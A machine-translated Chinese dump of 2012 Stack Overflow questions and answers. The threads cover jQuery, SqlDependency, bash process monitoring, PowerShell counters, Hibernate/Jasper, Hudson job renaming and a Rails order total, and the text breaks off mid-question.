每次你`.css("cursor","pointer")`在前一个方法完成后直接运行另一个方法（例如），你就是在做所谓的[链接](http://tobiasahlin.com/blog/quick-guide-chaining-in-jquery/)。jQuery 方法是返回它们操作的 jQuery 对象的函数。但是有些方法，比如`.find()`，实际上会改变返回对象的底层元素。您可以将方法`.css`视为**返回原始 jQuery 对象**，将方法`.find()`视为**返回新的 jQuery 对象**。当您浏览 jQuery 文档时，请注意每个方法的返回值。

对于更具可读性的代码，您可以避免链接，因此您始终知道自己在操作什么。像这样：

```
$(function() {

  var $carousel = $('#foo3'); // caching the initial jQuery object in a variable.

  $carousel.carouFredSel({
    auto    : true,
    scroll  : {
      items       : 1,
      duration    : 1000,
      mousewheel  : true,
      wipe        : true,
      pauseOnHover: true,
      onAfter     : function() {
        if ( $(this).triggerHandler( "currentPosition" ) == 0 ) {
          $(this).trigger( "pause" );
        }
      }
    }
  });

  // change the css of the carousel's parent.
  $carousel.parent().css('margin','auto');

  // modify each <li> child of the carousel.
  $carousel.find("li")
    .click(function() {
      var deviation = parseInt( $("#foo3_deviation").val() );
      $("#foo3").trigger("slideTo", [$(this), deviation]);
    })
    .css("cursor", "pointer");

}); 
```

我知道如果你只是写了一点点代码并且你不关心内部，这很难理解，但是如果你对 jQuery 的工作有更多的了解，你将能够使用它很多快点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T15:27:29.803

由于我无法获得任何帮助并且成功地度过了这个难关，我想我会发布结果，以防其他使用 caroufredsel 的人需要帮助来实现相同的效果。

这是完成的代码：

```
 $(function() {

        $("#foo3").carouFredSel({
            auto    : true,
            scroll  : {
            items: 1,
                duration: 1000,
                mousewheel: true,
                wipe: true,
                pauseOnHover: true,
               onAfter: function() {
            if ( $(this).triggerHandler( "currentPosition" ) == 0 ) {
              $(this).trigger( "pause" );
             }
          }},
            }).find("li").click(function() {
            var deviation = parseInt( $("#foo3_deviation").val() );
            $("#foo3").trigger("slideTo", [$(this), deviation]);
            }).css("cursor", "pointer");
            $("#foo3").parent().css("margin", "auto");
        }); 
```

# jquery-isotope - Internet Explorer 中的慢同位素动画

> ID：10218634
> 
> 赞同：1
> 
> 时间：2012-04-18T21:55:55.840
> 
> 标签：jquery-isotope

我正在使用 Isotope，但在 Internet Explorer 中遇到问题。在 Chrome/Firefox 中，动画在一秒钟内完成。IE 7-9 需要五秒钟。

正在使用过渡，CSS 与[http://isotope.metafizzy.co/docs/animating.html#css_transitions中列出的相同](http://isotope.metafizzy.co/docs/animating.html#css_transitions)

加载脚本的 JS：

```
$('#timeline').isotope({
    itemSelector : '.item',
    transformsEnabled: true,
    layoutMode: 'spineAlign',
    spineAlign:{
        gutterWidth: 56
    },
    getSortData: {
        timestamp: function($elem){
            return parseFloat($elem.find('.timestamp').text());
        }
    },
    sortBy: 'timestamp',
    sortAscending: false,
    itemPositionDataEnabled: true
}); 
```

有谁知道为什么 IE 这么慢？

我忘记提到的一件事（有点重要）是我有几个排序按钮可以做两件事：

1.  调整某些项目的“时间戳”
2.  度假物品

    ```
    $('#timeline').isotope('reloadItems').isotope({sortAscending: false}); 
    ```

正是这个过程在 IE 中很慢。不是初始页面加载。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-24T13:09:52.777

因为 Chrome 和 Firefox 支持 css 转换并将工作卸载到 GPU。IE高达9没有。这意味着所有的“转换”都是用 Javascript 计算的，这在性能上要高得多。

[http://caniuse.com/#feat=css-transitions](http://caniuse.com/#feat=css-transitions)

# c# - SqlDependency 简单选择查询总是返回“无效”

> ID：10218635
> 
> 赞同：6
> 
> 时间：2012-04-18T21:55:57.770
> 
> 标签：c#, sql, service-broker, sqldependency

我试图让 SqlDependency 对象给我通知，但到目前为止我无法让它工作。

我发送的 sql 查询是这样的：

```
SELECT [SocialMedia].[dbo].[Items].[Id]
  FROM [SocialMedia].[dbo].[Items] 
```

我试过带和不带大括号，有完全限定的名称，只有变量名，以及介于两者之间的所有内容。

Id 是我在[为通知创建查询](http://msdn.microsoft.com/en-us/library/ms181122.aspx)文章`Guid`中没有看到任何提及它们不适用于 SqlDependency 对象的类型

我还尝试发送多个列，看看是否可行。

```
 SELECT SocialMedia.dbo.Items.Id, 
         SocialMedia.dbo.Items.DateTimeCreated, 
         SocialMedia.dbo.Items.AuthorId
  FROM   SocialMedia.dbo.Items 
```

这也没有奏效。

* * *

# 这是我的表 SQL：

```
USE [SocialMedia]

SET ANSI_NULLS ON
SET QUOTED_IDENTIFIER ON
SET ANSI_PADDING ON

CREATE TABLE [dbo].[Items](
    [Id] [uniqueidentifier] NOT NULL,
    [DateTimeCreated] [datetimeoffset](7) NOT NULL,
    [AuthorId] [uniqueidentifier] NOT NULL,
    [Source] [varchar](max) NOT NULL,
    [PlaceId] [uniqueidentifier] NULL,
    [FullText] [varchar](max) NOT NULL,
    [Geography] [geography] NULL,
    [DateTimeAdded] [datetime] NULL,
 CONSTRAINT [PK_Items] PRIMARY KEY CLUSTERED ( [Id] ASC ) 
                 WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, 
                 IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, 
                 ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY]

GO

ALTER TABLE [dbo].[Items]  WITH CHECK ADD  CONSTRAINT [FK_Items_Places] 
FOREIGN KEY([PlaceId]) REFERENCES [dbo].[Places] ([Id])

ALTER TABLE [dbo].[Items] CHECK CONSTRAINT [FK_Items_Places]

GO
ALTER TABLE [dbo].[Items]  WITH CHECK ADD  CONSTRAINT [FK_Items_Users] 
FOREIGN KEY([AuthorId]) REFERENCES [dbo].[Users] ([Id])

ALTER TABLE [dbo].[Items] CHECK CONSTRAINT [FK_Items_Users] 
```

# 我的数据库：

```
USE [master]
GO

CREATE DATABASE [SocialMedia]
 CONTAINMENT = NONE
 ON  PRIMARY 
 ( NAME = N'SocialMedia', 
   FILENAME = N'C:\Program Files\Microsoft SQL Server\MSSQL11.DENALI\MSSQL\DATA\SocialMedia.mdf' , 
    SIZE = 1110016KB , MAXSIZE = UNLIMITED, FILEGROWTH = 1024KB )
 LOG ON 
( NAME = N'SocialMedia_log', 
  FILENAME = N'C:\Program Files\Microsoft SQL Server\MSSQL11.DENALI\MSSQL\DATA\SocialMedia_log.ldf' , 
  SIZE = 123648KB , MAXSIZE = 2048GB , FILEGROWTH = 10%)
GO

ALTER DATABASE [SocialMedia] SET COMPATIBILITY_LEVEL = 110
GO

IF (1 = FULLTEXTSERVICEPROPERTY('IsFullTextInstalled')) BEGIN
  EXEC [SocialMedia].[dbo].[sp_fulltext_database] @action = 'enable'
END
GO

ALTER DATABASE [SocialMedia] SET ANSI_NULL_DEFAULT OFF 
ALTER DATABASE [SocialMedia] SET ANSI_NULLS ON 
ALTER DATABASE [SocialMedia] SET ANSI_PADDING ON 
ALTER DATABASE [SocialMedia] SET ANSI_WARNINGS ON 
ALTER DATABASE [SocialMedia] SET ARITHABORT ON 
ALTER DATABASE [SocialMedia] SET AUTO_CLOSE OFF 
ALTER DATABASE [SocialMedia] SET AUTO_CREATE_STATISTICS ON 
ALTER DATABASE [SocialMedia] SET AUTO_SHRINK OFF 
ALTER DATABASE [SocialMedia] SET AUTO_UPDATE_STATISTICS ON 
ALTER DATABASE [SocialMedia] SET CURSOR_CLOSE_ON_COMMIT OFF 
ALTER DATABASE [SocialMedia] SET CURSOR_DEFAULT  GLOBAL 
ALTER DATABASE [SocialMedia] SET CONCAT_NULL_YIELDS_NULL ON 
ALTER DATABASE [SocialMedia] SET NUMERIC_ROUNDABORT OFF 
ALTER DATABASE [SocialMedia] SET QUOTED_IDENTIFIER ON 
ALTER DATABASE [SocialMedia] SET RECURSIVE_TRIGGERS OFF 
ALTER DATABASE [SocialMedia] SET  ENABLE_BROKER 
ALTER DATABASE [SocialMedia] SET AUTO_UPDATE_STATISTICS_ASYNC OFF 
ALTER DATABASE [SocialMedia] SET DATE_CORRELATION_OPTIMIZATION OFF 
ALTER DATABASE [SocialMedia] SET TRUSTWORTHY OFF 
ALTER DATABASE [SocialMedia] SET ALLOW_SNAPSHOT_ISOLATION OFF 
ALTER DATABASE [SocialMedia] SET PARAMETERIZATION SIMPLE 
ALTER DATABASE [SocialMedia] SET READ_COMMITTED_SNAPSHOT OFF 
ALTER DATABASE [SocialMedia] SET HONOR_BROKER_PRIORITY OFF 
ALTER DATABASE [SocialMedia] SET RECOVERY FULL 
ALTER DATABASE [SocialMedia] SET  MULTI_USER 
ALTER DATABASE [SocialMedia] SET PAGE_VERIFY CHECKSUM  
ALTER DATABASE [SocialMedia] SET DB_CHAINING OFF 
ALTER DATABASE [SocialMedia] SET FILESTREAM( NON_TRANSACTED_ACCESS = OFF ) 
ALTER DATABASE [SocialMedia] SET TARGET_RECOVERY_TIME = 0 SECONDS 
ALTER DATABASE [SocialMedia] SET  READ_WRITE 
```

# 我用来运行它的代码：

```
string connString = ConfigurationManager.ConnectionStrings["ApplicationServices"].ConnectionString;
conn = new SqlConnection(connString);
conn.Open(); // open new connection and create command to notify about all new Chat-Messages in -ROOM_NUMBER- const
using (var sqlCommand = new SqlCommand(GetSearchQueryString(searchItems), conn))
{
    var sqlDependency = new SqlDependency(sqlCommand
    //handle onChange event - this will be fired whenever there is a change in database that affacts our query
    sqlDependency.OnChange += (sender, e) =>
    {
        //change detected - get all messages...
        try
        {

            var sql = GetSearchQueryString(searchItems);
            int count = _entities.ExecuteStoreQuery<Guid>(sql).Count();

            AsyncManager.Parameters["count"] = count;
        }
        finally
        {
            AsyncManager.OutstandingOperations.Decrement();
        }
    };
    sqlCommand.ExecuteNonQuery();
} 
```

我`SqlDependency.Start(ConfigurationManager.ConnectionStrings["ApplicationServices"].ConnectionString);`在程序的早些时候打电话。

我错过了什么吗？我觉得我错过了一些明显的东西......

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-18T23:45:06.037

我发现 SqlDependency 非常脆弱。有时，如果您做了一些无效的事情，您总是会立即收到通知。没有错误信息。

尝试从查询中删除数据库名称限定。像这样引用表格：`dbo.Items`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T13:49:46.137

我们按照[http://dimarzionist.wordpress.com/2009/04/01/how-to-make-sql-server-notifications-work/中描述的步骤进行操作](http://dimarzionist.wordpress.com/2009/04/01/how-to-make-sql-server-notifications-work/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-18T14:44:12.453

看起来您使用的是三个部分名称，即

`[SocialMedia].[dbo].[Items].[Id]`

该文档明确指出您需要使用两个部分名称，因此更改为

`[SocialMedia].[Items].[Id]`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-30T11:12:27.993

迈克尔的回答是一个很好的来源，但微软没有提到一件事：

> **SQL 代理将拒绝具有计算列**的表上的 SELECT 语句

 **如果您尝试，您将获得一个带有 info=Query、type=Subscribe 的 SqlNotificationEventArgs，并且像我一样，您将花费数小时试图找出该语句出了什么问题，而罪魁祸首是计算列。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2014-11-20T05:43:36.707

在您的 SQL Server 中执行

> ALTER DATABASE YOURDBNAME SET ENABLE_BROKER WITH ROLLBACK IMMEDIATE**

# c# - 向上增加矩形高度

> ID：10218637
> 
> 赞同：2
> 
> 时间：2012-04-18T21:56:04.980
> 
> 标签：c#, silverlight, height

在 Silverlight 中，有没有办法以编程方式向上增加矩形的高度？目前，当我使用 时`rect.Height = 10;`，它会向下扩展。我正在尝试创建从零高度向上扩展的矩形，以便当用户沿着地面行走时，它会从地面弹出。我不想向上平移矩形，因为地面小于矩形的最大高度，所以我不能让它预先存在于给定的高度。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:57:22.923

如果你在改变高度的同时向上移动矩形的 Y 坐标，你应该得到你正在寻找的东西。

问题是一个角落是盒子注册的地方。我猜想在 Silverlight 中，左上角是它的注册位置。更改高度不会移动注册的角。所以你必须移动它并同时改变高度。

# bash - 检测 bash 中的挂起程序

> ID：10218640
> 
> 赞同：1
> 
> 时间：2012-04-18T21:56:17.130
> 
> 标签：bash

我正在开发一个用于收听和录制彩信流的应用程序；目前我正在用 bash 脚本为我的老板做一个概念验证。要记录，我想使用 mimms：

```
mimms <mms://url> download_to_file 
```

mimms 的输出是：

```
connecting
<mms://url> <=> download_to_file
1MB / 10 MB (20 kB/s, 00:01:30 remaining) 
```

最后一行是大约每秒更新一次的状态消息。

处理不稳定的网络时会出现问题。当网络掉线时，mimms 将挂起。download_to_file 中没有添加新数据（文件大小不变，不会增加），但 mimms 不会退出，甚至在重新建立网络连接时也不会恢复下载。它只是挂起，也不输出新的状态消息行。

我想在没有从 mimms 输出新行时检测到它，杀死 mimms，然后继续下载：

```
mimms -r mms://url download_to_file 
```

但我不知道如何测试这些条件，并且非常感谢有关如何处理这个问题的建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:22:35.253

您可以在后台启动 mimms（通过将 a 添加`&`到命令中）并让您的脚本循环等待，定期检查下载文件的大小。如果 mimms 仍在运行但文件大小没有改变，假设 mimms 已挂起并终止它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T22:43:02.207

我自己想出了一个解决方案，它依赖于 mimms 的输出，而不是 mimms 生成的文件的大小：

1.  在后台启动程序，将输出从 mimms 重定向到日志文件
2.  定期读取该文件的最后一行
3.  如果同一行连续出现两次，杀死 mimms 并重新启动它
4.  重复此操作，直到 mimms 输出“下载完成！”

    ```
    LAST1="a"
    LAST2="b"
    MSG="Starting download of $PATH1"
    until [ "$LAST1" = "Download complete!" ]; do
        echo $MSG
        mimms -r $URL "$PATH1" >> log 2>&1 &
        PID=$!
        echo $PID

        until [ "$LAST1" = "$LAST2" ]; do
            LAST2="$LAST1"
            sleep 60
            LAST1=$(tail -1 log)
            echo "$LAST1"
        done
        kill $PID
        MSG="Download incomplete. Retry..."
    done 
    ```

# c# - 如何在 VS 创建的 exe 中嵌入引用？

> ID：10218648
> 
> 赞同：2
> 
> 时间：2012-04-18T21:56:43.793
> 
> 标签：c#, mysql, visual-studio-2010, dll, mysql-connector

我在我的项目中使用 mysql .NET 连接器库 (Mysql.Data)。据我了解，我只需要在安装连接器后使用程序集文件夹中的 mysqldata.dll 即可。我将在具有 .NET 2.0 但没有连接器的计算机上使用该程序。

如何将 .dll 文件添加到项目中，以便在内部使用 dll - 我希望这是有道理的。如果程序调用 .NET 来找到它，（就像它所做的那样） - 整个事情都会失败并出错。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:00:09.600

在解决方案资源管理器中，在您的项目下，展开引用，选择 MySql.Data 程序集，查看程序集的属性，然后将**Copy Local 更改为 True**。现在当你编译项目时，MySql.Data.dll 将被输出到 bin 目录。

（您不会将一个程序集嵌入到另一个程序集中。相反，您将 MySql.Data.dll 与构建输出中所需的所有其他内容一起部署。这被称为添加引用......我不认为你真的想嵌入它。）

# objective-c - CALayer 从当前值淡出

> ID：10218650
> 
> 赞同：5
> 
> 时间：2012-04-18T21:56:54.407
> 
> 标签：objective-c, cocoa-touch, core-animation, calayer

我的应用程序用于`CALayer`绘制视图。更准确地说，它`drawLayer:inContext:`在 a`UIView`的顶层的子层上使用​​该方法。这是让连续`drawLayer:inContext:`绘图的“隐式”动画随着时间的推移逐渐淡入彼此的好方法。渐变动画发生得相当快，可能在 0.25 秒内，但要更改其持续时间，只需实现另一个名为`actionForLayer:forKey:`. 在这个完美运行的示例实现中，默认持续时间延长到 2.0 秒：

```
- (id<CAAction>)actionForLayer:(CALayer *)layer forKey:(NSString *)event
{
    CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:event];
    animation.duration = 2.0;
    return animation;

    // or return nil for the default duration.
} 
```

关于手头的问题。

如果你调用`[sublayer setNeedsDisplay]`的速度快于渐变完成的时间，那么每次新的渐变你都会看到一个突然的跳跃。从外观上看，正在进行的淡入淡出被取消，它的最终状态被用作新淡入淡出的起点。这可能并不令人惊讶，但视觉结果是相当不受欢迎的。

考虑从黑色到白色的 10 秒渐变，在开始后 5 秒触发另一个渐变到黑色的场景。动画将开始从黑色渐变为白色，但是当它处于“半灰色”时，它会跳到全白，然后再次渐变为黑色。

有没有办法防止这种情况发生？我可以让图层从灰色变回黑色吗？有没有相当于说的 CALayer 绘图`UIViewAnimationOptionBeginFromCurrentState`（在 UIView 动画中使用）？

干杯。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-28T17:06:15.987

层的动画只是层在动画时应该是什么样子的视觉表示。在 CA 中，当您从一种状态动画到另一种状态时，图层的整个状态会立即更改。创建一个表示层并显示动画，当动画完成时，实际层留在最后。

*所以，*我的猜测是，当你想从一种状态转换到另一种状态时，并且当前动画尚未完成，你必须捕获动画的当前状态，然后将其用作下一个动画的起点。

问题在于无法修改图层的当前动画。

在下面的文章中，我捕获了动画的当前状态，将其设置为图层的当前状态，并将其用作动画的起始值。该帖子将此技术应用于动画的速度/持续时间，但也可以应用于您的场景。

[https://stackoverflow.com/a/9544674/1218605](https://stackoverflow.com/a/9544674/1218605)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T14:43:43.507

我对这个也有点难过。

您是否忘记指定 fillMode `kCAFillModeForwards`。[在参考文档中](http://developer.apple.com/library/mac/#documentation/GraphicsImaging/Reference/CAMediaTiming_protocol/Introduction/Introduction.html#//apple_ref/occ/intf/CAMediaTiming)有更多信息。

例如，尽管我没有更改持续时间，但我让它在没有任何捕捉的情况下工作。

```
@implementation FadingLayer

- (void)fadeOut {    
    CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:@"backgroundColor"];
    animation.fillMode = kCAFillModeForwards;
    animation.fromValue = (id)[UIColor redColor].CGColor;
    animation.toValue = (id)[UIColor colorWithRed:1.0 green:0.0 blue:0.0 alpha:0.0].CGColor;
    animation.removedOnCompletion = FALSE;
    animation.delegate = self;    
    [self addAnimation:animation
                    forKey:@"test"];
}

- (void)fadeIn {
    CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:@"backgroundColor"];
    animation.fillMode = kCAFillModeForwards;
    animation.fromValue = (id)[UIColor colorWithRed:1.0 green:0.0 blue:0.0 alpha:0.0].CGColor;
    animation.toValue = (id)[UIColor redColor].CGColor;
    animation.removedOnCompletion = FALSE;
    animation.delegate = self;    
    [self addAnimation:animation
                    forKey:@"test"];
}

@end 
```

但是，您可能希望为[自定义属性](http://developer.apple.com/library/mac/#documentation/GraphicsImaging/Reference/CAMediaTiming_protocol/Introduction/Introduction.html#//apple_ref/occ/intf/CAMediaTiming)设置动画。

希望这可以帮助 ：/

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-17T00:03:00.580

我想用层树的缩放动画来完成同样的事情。我有一个放大/缩小键等效项，用户可以相应地缩放图层树。但是，如果用户快速连续按下等效缩放键，则将临时快速恢复到动画开始之前的值，因为之前的动画尚未完成。

在动画代码的最后，执行一个单一的`[CATransaction commit]`强制所有未决事务在下一个动画开始之前提交到层模型，并解决了问题。

文档说：

> + 提交
> 
> 提交当前事务期间所做的所有更改。
> 
> **宣言**
> 
> +（无效）提交
> 
> **特别注意事项**
> 
> 如果当前不存在事务，则引发异常。

但是，`[CATransaction commit]`连续使用许多消息对此进行测试实际上并不会引发异常。我使用了同样的技术来压制表单的警告：

> CoreAnimation：警告，删除了未提交 CATransaction 的线程；

在 NSOperation 中，其执行线程在层动画之前完成。如果当前不存在交易，Apple 可能会在最近的操作系统版本中将此行为更改为无操作（这会更明智），而不更新文档。

# powershell - Get-Counter with Jobs 返回不可用的数据

> ID：10218651
> 
> 赞同：2
> 
> 时间：2012-04-18T21:56:58.147
> 
> 标签：powershell, powershell-2.0

我有一个我想改进的基本脚本，所以它会关闭并收集性能计数器作为作业，而不是我目前正在做的事情（集中检索计数器）。

问题是，当我在 Powershell 的作业中运行 Get-Counter 时，无法正确检查/使用返回的数据。我认为这是因为它序列化了数据。

这是我的脚本，非常基本：

```
Start-Job -ScriptBlock {$Counter = Get-Counter "\LogicalDisk(C:)\% Free Space" -MaxSamples 1 -SampleInterval 1 ; return $Counter}

do
{
    [array]$JobCount = Get-Job -State "Completed"
    $JobResults = Get-Job | Receive-Job

    if ($JobCount.Count -gt 0)
    {
        Write-Host "Job Completed"
    }
    else
    {
        Write-Host "Sleeping 1 Second..."
        Start-Sleep 1
    }
}
while ($JobCount.Count -lt 0)

$JobResults.CounterSamples 
```

$JobResults.CounterSamples 返回一个字符串，上面写着“Microsoft.PowerShell.Commands.GetCounter.PerformanceCounterSample”。那是计数器对象的数据类型。

如果我在工作之外运行它，它返回就好了：

```
$Counter = Get-Counter "\LogicalDisk(C:)\% Free Space" -MaxSamples 1 -SampleInterval 1
$Counter.CounterSamples 
```

有人知道我如何正确使用作业结果中的数据吗？

仍然没有我正在寻找的答案，有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T09:40:37.507

我自己找到了一种解决方法，基本上是在作业本身中处理 Countersamples，而不是尝试将结果传回处理：

```
$ScriptBlock = {

    param
    (
        $Server,
        $ExportCSV
    )

    $Counter = Get-Counter -ComputerName $Server "LogicalDisk(C:)\% Free Space" -MaxSamples 10 -SampleInterval 2
    $CounterSamples = $Counter | % {$_.CounterSamples}

    $MasterArray = @()
    foreach ($CounterSample in $CounterSamples)
    {
        $TempArray = @()
        $TempArray = "" | Select Server, ObjectName, CounterName, InstanceName, Value, DateTime

        $Split = $CounterSample.Path.Remove(0,2)
        $Split = $Split.Split("\")

        $TempArray.Server = $Split[0]
        $TempArray.ObjectName = $Split[1].Split("(")[0]
        $TempArray.CounterName = $Split[2]
        $TempArray.InstanceName = $CounterSample.InstanceName
        $TempArray.Value = $CounterSample.CookedValue
        $TempArray.DateTime = $CounterSample.TimeStamp.ToString("yyyy-MM-dd HH:mm:ss")

        $MasterArray += $TempArray
    }

    $MasterArray | Export-Csv $ExportCSV -NoType
}

$Servers = "CHRIS-PC"

foreach ($Server in $Servers)
{
    $ExportCSVFile = "C:\Temp\$Server" + "_Samples.csv"
    Start-Job -ScriptBlock $ScriptBlock -ArgumentList @($Server, $ExportCSVFile)
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T06:05:48.757

我发现的唯一一件事是使用扩展属性`Readings`

```
$JobResults.Readings 
```

但是你为什么不使用 WMI ：

```
[WMI]"root\cimv2:Win32_LogicalDisk.DeviceID='C:'" 
```

# java - Hibernate 获取 JasperRunManager 的 Connection 对象

> ID：10218655
> 
> 赞同：1
> 
> 时间：2012-04-18T21:57:25.220
> 
> 标签：java, hibernate, odbc, jasper-reports

我在项目中使用 Hibernate 3.2.5 和 Jasper 3.7.2 为应用程序生成一些报告。

有没有办法从 HibernateSessionFactory 对象中获取连接对象？我只想处理一个连接，因为此时我必须有一个用于 ODBC 连接的属性文件，该文件将通过 JasperRunManager 静态方法处理 Jasper，并为另一端处理 Hibernate。

这是我需要通过连接的方法：

```
byte[] net.sf.jasperreports.engine.JasperRunManager.runReportToPdf(InputStream inputStream, Map parameters, Connection conn) throws JRException 
```

提前致谢。:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T11:44:22.793

我对休眠 4 有同样的问题，这是解决方案

```
Session ses = ...
final InputStream finalCompiledReportStream = compiledReportStream;
final OutputStream finalByteArrayOutputStream = byteArrayOutputStream;
ses.doWork(new Work() {
    public void execute(Connection connection) throws SQLException {
       try {
           JasperFillManager.fillReportToStream(finalCompiledReportStream, finalByteArrayOutputStream, parameters, connection);
       } catch (JRException e) {
           ReportAction.this.logger.error(e);
       }
    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-17T10:07:24.010

这非常有效，您可以在代码中可能需要它的其他地方使用连接对象。doWork 可能需要您多次执行此操作，但创建一个连接对象 nice 是一种更简洁的解决方案。

```
SessionImpl sessionImpl = (SessionImpl) session;
Connection conn = sessionImpl.connection(); 
```

`session`Hibernate Session 对象的名称在哪里

# visual-studio - Visual Studio 中的资源视图

> ID：10218657
> 
> 赞同：1
> 
> 时间：2012-04-18T21:57:33.823
> 
> 标签：visual-studio

我写了一个程序并编译成功，还检查了exe文件。当我重新启动视觉工作室时；并想从 Visual Studio 的资源视图中打开输出文件；它给出了一个错误“在另一个编辑器中打开”。没有这样的编辑器。我也重新启动了我的笔记本电脑，但它不起作用——“在另一个编辑器中打开”错误位于 Visual Studio 的资源视图下。而不是资源视图下的 .rc 文件，该错误出现在资源视图选项卡下。我也关闭了所有的窗户。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T22:06:26.827

您可能在另一个选项卡中以文本模式打开了 .rc 或 Resource.h 文件。关闭所有源窗口并重试。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-20T07:23:16.270

就我而言，删除 .suo 文件是解决方案

# ios - iOS 4.0 推特集成

> ID：10218658
> 
> 赞同：0
> 
> 时间：2012-04-18T21:57:36.537
> 
> 标签：ios, session, twitter, login, token

我正在开发一个需要使用社交媒体（Facebook、twitter）登录的应用程序。从这些服务中，我只需要获取会话令牌。因此，当用户按下“使用 Twitter 按钮登录”时，我希望有一个类似于 Facebook 应用程序所做的登录方法，它登录用户然后返回会话令牌。

我想要一些关于从哪里开始的指示。我搜索了官方 API 文档，但似乎使用 Oath 进行开发非常复杂，并且需要我目前无法投入的时间。我偶然发现了 MGTwitterEngine，但是我没有看到获取 OAuth 会话令牌的方法，而且它已经 3 年没有更新了！[https://github.com/mattgemmell/MGTwitterEngine](https://github.com/mattgemmell/MGTwitterEngine)

谁能指出我正确的方向？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T22:33:37.927

您应该使用 API 和 OAuth。尝试避免 OAuth 可能会更加困难并且需要更长的时间。只需将 twitter 或 facebook 登录页面放在 UIWebView 中，然后从那里开始。

从 Facebook 获取 oAuth 令牌非常简单，iOS facebook API 提供了它。获取 Twitter API 令牌只需解析返回给您的 URL。尼特是非常困难的。

# html - 在进行自由网页设计/开发时获得 FTP 访问是标准的吗？

> ID：10218660
> 
> 赞同：-1
> 
> 时间：2012-04-18T21:57:42.250
> 
> 标签：html, ftp

在进行自由网页设计/开发时获得 FTP 访问是标准的吗？

我正在为一家公司重新设计一个页面，我要求他们访问 FTP 是否有意义？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:02:08.307

没有什么是标准的，它取决于业务的要求。他们可能只是想让你交出代码，在这种情况下就不需要了。他们可能希望您负责部署，在这种情况下，您可能需要某种对生产机器的访问权限。也不要要求 FTP 它不安全而且看起来有点业余。相反，要求 SFTP 访问或多或少相同，但它通过 SSH 运行，因此您可以免费获得安全性。

# java - 批量重命名 Hudson 作业

> ID：10218663
> 
> 赞同：3
> 
> 时间：2012-04-18T21:57:53.530
> 
> 标签：java, hudson

[这个问题](https://stackoverflow.com/questions/7031160/can-i-mass-edit-hudson-jobs-by-modifying-the-config-xml-files)讨论了 Hudson 中的批量重命名作业，但只提到了修改 config.xml 文件。

[http://wiki.hudson-ci.org/display/HUDSON/Administering+Hudson](http://wiki.hudson-ci.org/display/HUDSON/Administering+Hudson)说您可以通过重命名作业所在的目录来重命名作业。

在我的 Hudson 设置中，我将许多作业捆绑在一起，并且还使用了嵌套视图插件，该插件在主 config.xml 文件中记录作业的名称。

似乎批量重命名作业的正确方法是重命名目录，然后编辑主 config.xml 文件，然后是每个作业目录中的 config.xml 文件。这是正确的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T08:43:28.023

直接编辑 config.xml 文件应该可以正常工作。或者，您可能想要使用 Hudson 的远程 API。

使用远程 API，重命名作业将是一个两步过程：

1.  复制作业，使用 POST 到`http://my-hudson-server/createItem?name=newJobName&mode=copy&from=oldJobName`

2.  删除旧作业，使用 POST`http://my-hudson-server/job/oldJobName/doDelete`

查看`http://my-hudson-server/api`有关如何使用远程 API 的更多详细信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T07:16:45.880

是的，这看起来是对的。

确保 Hudson 处于脱机状态或“准备关闭”并且没有受影响的作业正在运行。然后从磁盘重新启动或重新加载作业。绝对必须事先备份您的配置。一个好主意是创建配置的副本并在那里测试您的更改。

# ruby-on-rails - 虚值 total_price 保存为 1 而不是总价格数

> ID：10218669
> 
> 赞同：2
> 
> 时间：2012-04-18T21:58:13.573
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1

`total_price`中的所有产品`cart`都没有按应有的方式保存。无论实际总价是多少，它总是显示 1。这个问题是在安装[货币 gem](https://github.com/RubyMoney/money)和[google_currency gem](https://github.com/RubyMoney/google_currency)之后出现的，所以我可以根据选择的语言环境更改产品本身的价格，而不仅仅是货币。

所以总价始终为 1，但同时我在购物过程中屏幕上显示的金额显示正确的数字，我的意思是如果我选择价格为 A 和 B 的 2 个产品，然后在购物车中（在屏幕上) 我有正确的 total_price = A+B .. 不仅如此，当我在填写信用卡字段后按下创建订单时，ActiveMerchant 将数据发送到贝宝，而贝宝的美元金额是我在购物车 A+B 中的总价格 ..

**问题是：**为什么应用程序获取权利`total_price`并将其发送到贝宝，但同时不能`total_price`在创建订单时将其存储在数据库中，而是保存 1。

当我创建**订单时****控制台**会说什么：

 **```
 (0.1ms)  BEGIN
  SQL (0.4ms)  INSERT INTO `orders` (`card_expires_on`, `card_type`, `cart_id`, `created_at`, `first_name`, `ip_address`, `last_name`, `total`, `updated_at`, `user_id`) VALUES ('2012-04-01', 'visa', 5, '2012-04-18 21:35:38', 'Rosca', '127.0.0.1', 'Sergiu', 1, '2012-04-18 21:35:38', 7) 
```

**order_transaction**详细信息：

```
